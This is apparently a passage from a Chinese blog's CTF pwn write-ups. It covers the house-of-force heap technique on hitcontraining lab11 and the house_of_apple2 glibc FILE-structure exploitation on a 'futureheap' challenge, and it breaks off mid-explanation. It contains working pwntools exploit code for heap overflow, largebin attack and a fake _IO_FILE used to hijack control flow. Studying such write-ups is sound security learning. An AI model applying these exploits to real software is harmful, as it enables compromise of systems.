<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MALLOC_ALIGNMENT_MASK (MALLOC_ALIGNMENT - 1)	<span class="comment">//32位系统上通常为0x7,64位上为0xf</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_SZ (sizeof(size_t))		<span class="comment">//32位系统上通常为4,64位上为8</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MINSIZE  \</span></span><br><span class="line"><span class="meta">  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))	<span class="comment">//0x20</span></span></span><br><span class="line"></span><br><span class="line">(((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span><br><span class="line">   MINSIZE :                                                      \</span><br><span class="line">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br></pre></td></tr></table></figure></div>
<p>由于<code>(req) + SIZE_SZ + MALLOC_ALIGN_MASK</code>一般都会大于MINSIZE，所以我们就要使我们输入req为<code>target_offset - SIZE_SZ - MALLOC_ALIGN_MASK</code>，这样我们只要target_add是关于16字节对齐的，那么最后申请出chunk就会使top_chunk偏移到我们想要的地址处。</p>
<h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><h5 id="hitcontraning-lab11"><a href="#hitcontraning-lab11" class="headerlink" title="hitcontraning_lab11"></a>hitcontraning_lab11</h5><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/03/house-of-force/image-20241003002919869.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/03/house-of-force/image-20241003002937355.png"
                      class=""
                >
<p>我们可以发现有对v4中函数指针的调用，而v4是一个指向堆的指针，那么我们就可以想办法改掉其中的函数指针实现任意地址的跳转，而程序中又有magic后门函数，所以思路就是改位于v4+8位置处的函数指针为magic，最后再传入5来调用magic。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/03/house-of-force/image-20241003002948587.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/03/house-of-force/image-20241003002955916.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/03/house-of-force/image-20241003003131870.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/03/house-of-force/image-20241003003143107.png"
                      class=""
                >
<p>可以发现change_item方法中我们可以任意控制输入大小，从而造成堆溢出，这里其实也可以用overlapping来构造double free，不过显然house_of_force更快更方便。</p>
<p>先把板子套上：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the length of item name:&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the name of item:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the index of item:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the length of item name:&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the new name of the item:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the index of item:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">end</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>具体打法：</p>
<p>首先溢出改top chunk的size域</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">magic = <span class="number">0x0000000000400D49</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&quot;AAAA&quot;</span>)   <span class="comment">#0</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x40</span>,<span class="string">b&quot;A&quot;</span>*<span class="number">0x38</span>+p64(<span class="number">0xfffffffffffffff1</span>))</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/03/house-of-force/image-20241003003151793.png"
                      class=""
                >
<p>然后算出偏移后申请一个目标大小的chunk</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">off = -<span class="number">0x60</span> - <span class="number">0x8</span> - <span class="number">0xf</span></span><br><span class="line">add(off,<span class="string">b&quot;AAAA&quot;</span>)    <span class="comment">#1</span></span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/03/house-of-force/image-20241003003155240.png"
                      class=""
                >
<p>此时我们发现top chunk已经到了目标位置处，再申请一个chunk就可以改写目标位置函数指针了。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,p64(magic)*<span class="number">2</span>)</span><br><span class="line">end()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
        <tag>house of</tag>
      </tags>
  </entry>
  <entry>
    <title>house_of_apple2利用手法浅析</title>
    <url>/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/</url>
    <content><![CDATA[<h4 id="适用版本"><a href="#适用版本" class="headerlink" title="适用版本"></a>适用版本</h4><ul>
<li>2.23——至今</li>
</ul>
<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
<li>能控制_IO_FILE的vtable和_wide_data(一般使用largebin attack)</li>
<li>程序从main函数返回，或者执行exit函数</li>
<li>能泄露libc_base和heap_base</li>
</ul>
<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><ol>
<li>劫持<code>IO_FILE</code>的<code>vtable</code>为<code>_IO_wfile_jumps</code></li>
<li>控制<code>_wide_data</code>为可控的堆地址空间</li>
<li>控制<code>_wide_data-&gt;_wide_vtable</code>为可控的堆地址空间</li>
<li>控制程序执行<code>IO</code>流函数调用，最终调用到<code>_IO_Wxxxxx</code>函数即可控制程序的执行流</li>
</ol>
<p>总体来说还是利用FSOP，最后<code>_IO_flush_all_lockp</code>中触发调用<code>_IO_OVERFLOW (fp, EOF)</code>这个虚表函数，因为到了高版本glibc，所以不能直接改虚表，需要借助到其他相似结构的其他虚表。</p>
<p>大致有三条链：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">_IO_wfile_overflow -&gt; _IO_wdoallocbuf -&gt; _IO_WDOALLOCATE -&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</span><br><span class="line"></span><br><span class="line">_IO_wfile_underflow_mmap -&gt; _IO_wdoallocbuf -&gt; _IO_WDOALLOCATE -&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</span><br><span class="line"></span><br><span class="line">_IO_wdefault_xsgetn -&gt; __wunderflow -&gt; _IO_switch_to_wget_mode -&gt; _IO_WOVERFLOW -&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x18)(fp)</span><br></pre></td></tr></table></figure></div>
<h4 id="利用细节"><a href="#利用细节" class="headerlink" title="利用细节"></a>利用细节</h4><p>这里以源鲁杯的futureheap这道题对这种利用方式进行学习。</p>
<h5 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h5><p>先熟悉一下几个结构体的具体字段。</p>
<h6 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="_IO_FILE"></a>_IO_FILE</h6><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109154309187.png"
                      class=""
                >
<h6 id="IO-wfile-jumps"><a href="#IO-wfile-jumps" class="headerlink" title="_IO_wfile_jumps"></a>_IO_wfile_jumps</h6><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109113127595.png"
                      class=""
                >
<h6 id="IO-file-jumps"><a href="#IO-file-jumps" class="headerlink" title="_IO_file_jumps"></a>_IO_file_jumps</h6><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241110004510956.png"
                      class=""
                >
<h6 id="IO-wide-data"><a href="#IO-wide-data" class="headerlink" title="_IO_wide_data"></a>_IO_wide_data</h6><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109232015744.png"
                      class=""
                >
<blockquote>
<p>在glibc2.24以后加入了对虚函数的检测，在调用虚函数之前首先会检查虚函数地址的合法性。</p>
<p>其检查流程为：计算_IO_vtable 段的长度（section_length），用当前虚表指针的地址减去_IO_vtable  段的开始地址，如果vtable相对于开始地址的偏移大于等于section_length，那么就会进入_IO_vtable_check进行更详细的检查，否则的话会正常调用。如果vtable是非法的，进入_IO_vtable_check函数后会触发abort。</p>
<p>虽然对vtable的检查较为严格，但是对于具体位置和具体偏移的检测则是较为宽松的，可以修改vtable指针为虚表段内的任意位置，也就是对于某一个<strong>_IO_xxx_jumps</strong>的任意偏移，使得其调用攻击者想要调用的IO函数。</p>
</blockquote>
<p>我们的思路就是借鉴FSOP，用_wide_data这个成员结构体中的_wide_vtable，同样是宏调用，但没有进一步的检测。</p>
<h5 id="1-IO-wfile-overflow链"><a href="#1-IO-wfile-overflow链" class="headerlink" title="1._IO_wfile_overflow链"></a>1._IO_wfile_overflow链</h5><p>源码：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_IO_wfile_overflow (FILE *f, <span class="type">wint_t</span> wch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_wdoallocbuf (f);</span><br><span class="line">	  _IO_free_wbackup_area (f);</span><br><span class="line">	  _IO_wsetg (f, f-&gt;_wide_data-&gt;_IO_buf_base,</span><br><span class="line">		     f-&gt;_wide_data-&gt;_IO_buf_base, f-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      _IO_doallocbuf (f);</span><br><span class="line">	      _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">          ......</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line">_IO_wdoallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WDOALLOCATE (fp) != WEOF)</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,</span><br><span class="line">		     fp-&gt;_wide_data-&gt;_shortbuf + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">      </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WJUMP0(FUNC, THIS) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS(THIS) _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CAST_FIELD_ACCESS(THIS, TYPE, MEMBER) (*(_IO_MEMBER_TYPE (TYPE, MEMBER) *)(((char *) (THIS)) \</span></span><br><span class="line"><span class="meta">				       + offsetof(TYPE, MEMBER)))</span></span><br></pre></td></tr></table></figure></div>
<p>首先最终的目标是<code>_IO_wdoallocbuf</code>中的<code>(wint_t)_IO_WDOALLOCATE (fp)</code>的调用，追踪几个宏定义会发现，最终执行了<code>*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</code>这样一个函数。这里的_wide_vtable实际上就是一个虚表，其0x68偏移处就是<code>__doallocate</code>这一项。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109155032548.png"
                      class=""
                >
<p>那么我们反向追溯一下，发现需要让如下的条件成立以绕过条件判断：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">fp-&gt;_wide_data-&gt;_IO_buf_base==<span class="number">0</span>;</span><br><span class="line">!(fp-&gt;_flags &amp; _IO_UNBUFFERED)!=<span class="number">0</span>;	<span class="comment">//(fp-&gt;_flags &amp; 0x2)==0;</span></span><br><span class="line">f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>;</span><br><span class="line">f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING == <span class="number">0</span>;		<span class="comment">//f-&gt;_flags &amp; 0x800 == 0;</span></span><br><span class="line">f-&gt;_flags &amp; _IO_NO_WRITES==<span class="number">0</span>;		<span class="comment">//f-&gt;_flags &amp; 0x8==0;</span></span><br></pre></td></tr></table></figure></div>
<p>伪造的_IO_FILE对<code>fp</code>的设置如下：</p>
<ul>
<li><code>_flags</code>设置为<code>~(2 | 0x8 | 0x800)</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code>sh;</code>，注意前面有两个空格</li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_overflow</code>即可</li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code>，因为_IO_FILE的0xa0偏移处是_wide_data域。</li>
<li><code>_wide_data-&gt;_IO_write_base</code>设置为<code>0</code>，即满足<code>*(A + 0x18) = 0</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li>
</ul>
<p>由于触发FSOP的<code>_IO_flush_all_lockp</code>函数中有这么一条判断，所以我们要使前两个条件有一个为真，也就是<code>fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code> 或 <code>_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</code>，第一个条件比较好满足。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">     <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">			    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">result = EOF;</span><br></pre></td></tr></table></figure></div>
<p>需要注意的是，最后是<code>call qword ptr [rax + 0x68]</code>实现跳转，所以在rax+0x68的位置不能直接是shellcode，而是一个合法的地址。在这里报错时就可以观察寄存器信息，这里rdx实质就指向我们之前伪造的fake_IO_FILE的_wide_data域。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109200034550.png"
                      class=""
                >
<p>这里setcontext能够把rdx作为一个类sigFrame的指针，然后恢复各字段。然后就能够进行各种操作了，比如进行srop等等。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109200645735.png"
                      class=""
                >
<p>现在我们来分析一下futureheap这道题</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109221708861.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109225750797.png"
                      class=""
                >
<p>首先这个init函数中是经典的伪随机数的利用，可以最终得到libc_base和一个fortune的地址，这个fortune是一个rwx的段，可以写shellcode然后想办法执行。这道题也刚好沙箱禁用了直接的execve调用和一些基本的orw函数。但是我们只要能劫持程序执行流，还是能比较方便的利用系统调用读取flag。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109230302958.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109230106028.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109230119254.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109230135976.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109230148959.png"
                      class=""
                >
<p>还是比较经典的菜单题，主要功能有add，delete和edit。其中delete存在UAF，add只能申请largebin chunk。edit有3次机会，之后会直接调用exit退出。然后还存在一个函数，只要输对密码就能往fortune中写入0x500字节。这个密码的获取是一个简单的换表base64。</p>
<p>那么我们就可以开始学习house of apple2的利用了，首先就是用largebin attack来把_IO_list_all改成我们一个largebin chunk的地址，然后再在该largebin chunk中伪造IO_FILE结构体。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x528</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x518</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x550</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">log.success(<span class="string">&quot;_io_list_all:&quot;</span>+<span class="built_in">hex</span>(_IO_list_all))</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(_IO_list_all-<span class="number">0x20</span>))</span><br></pre></td></tr></table></figure></div>
<p>一开始的largebin attack过程就不过多赘述了，先留一个chunk在largebin里，改掉其bk_nextsize域为<code>tar-0x20</code>，然后再让一个较小的chunk进入到largebin时，就能触发glibc2.31版本以上的改单一地址的largebin attack。到这里我们的_IO_list_all被成功改写成largebin chunk的地址。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109231242168.png"
                      class=""
                >
<p>然后最关键的就是这个<code>_IO_FILE</code>结构体的构造,由于我们是从数据域开始写，所以一开始的<code>_flags</code>和<code>_IO_read_ptr</code>是无法通过edit控制的。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">fake_IO_FILE  = p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) + p64(<span class="number">2</span>) <span class="comment">#_write_base,_write_ptr</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)+p64(<span class="number">0</span>) <span class="comment">#_IO_buf_base,_IO_buf_end </span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)      <span class="comment">#_IO_save_base</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)      <span class="comment">#_IO_backup_base</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)       <span class="comment">#_lock</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fortune+<span class="number">0x18</span>)    <span class="comment">#_wide_data</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xb0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)            <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE += p64(fortune+<span class="number">0x108</span>)       <span class="comment">#setcontext-&gt;rsp</span></span><br><span class="line">fake_IO_FILE += p64(fortune+<span class="number">0x108</span>)     <span class="comment">#setcontext-&gt;rcx</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(_IO_wfile_jumps)  <span class="comment"># vtable</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xf8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fortune+<span class="number">0x100</span>-<span class="number">0x68</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(setcontext+<span class="number">61</span>) + shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,fake_IO_FILE)</span><br><span class="line"></span><br><span class="line">passwd = <span class="string">&quot;74r0t#C@rd&quot;</span></span><br><span class="line">out()</span><br><span class="line">p.sendline(passwd)</span><br><span class="line">p.sendline(fake_IO_FILE)</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109231530476.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109233732611.png"
                      class=""
                >
<p>首先将<code>write_base</code>和<code>write_ptr</code>这两个字段分别置1和2，并且把mode置0是为了满足<code>_IO_flush_all_lockp</code>中一个条件，原理见上文。之后要把vtable指向<code>_IO_wfile_jumps</code>，这是因为虽然在glibc2.24及以上多了一个对虚表地址的检测，使其不能偏离所在段太远，但是我们还是可以利用附近的别的虚表进行利用。这里我们选择触发的是<code>_IO_wfile_jumps</code>的<code>_IO_wfile_overflow</code>。也就是<code>_IO_flush_all_lockp</code>中的<code>_IO_OVERFLOW (fp, EOF)</code>这个。因为多态的设计，虚表的结构都是一样的，所以我们本来是调用正常的overflow虚表函数，这里我们劫持到<code>_IO_wfile_jumps</code>后，我们调用的就是<code>__GI__IO_wfile_overflow</code>。然后其具体函数实现里给了我们可趁之机。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109232222317.png"
                      class=""
                >
<p>然后就能进入<code>_IO_wfile_overflow</code>中。这里我们_flags字段为0，是能够满足里面的各种条件的。然后最关键的就是伪造的<code>IO_FILE</code>的<code>_wide_data</code>这个字段的赋值，因为我们没有堆的基址，但有一个fortune的地址，所以我们可以把伪造的<code>_wide_data</code>这个结构体放到fortune这个位置处，为了方便我们可以复用原来的伪造到堆上的IO_FILE结构，但是因为要使<code>f-&gt;_wide_data-&gt;_IO_write_base == 0</code>，所以我们进行一定的错位，这里我选择的是把<code>_wide_data</code>弄到<code>fortune+0x18</code>，这个位置去。然后就能满足下面这两个条件</p>
<blockquote>
<ul>
<li><code>_wide_data-&gt;_IO_write_base</code>设置为<code>0</code>，即满足<code>*(A + 0x18) = 0</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li>
</ul>
</blockquote>
<p>之后来看后面的构造，我们要找到一个B的位置，然后控制<code>*(B + 0x68)</code>，这样就能把我们的RIP劫持到目标地址处去了</p>
<blockquote>
<ul>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li>
</ul>
</blockquote>
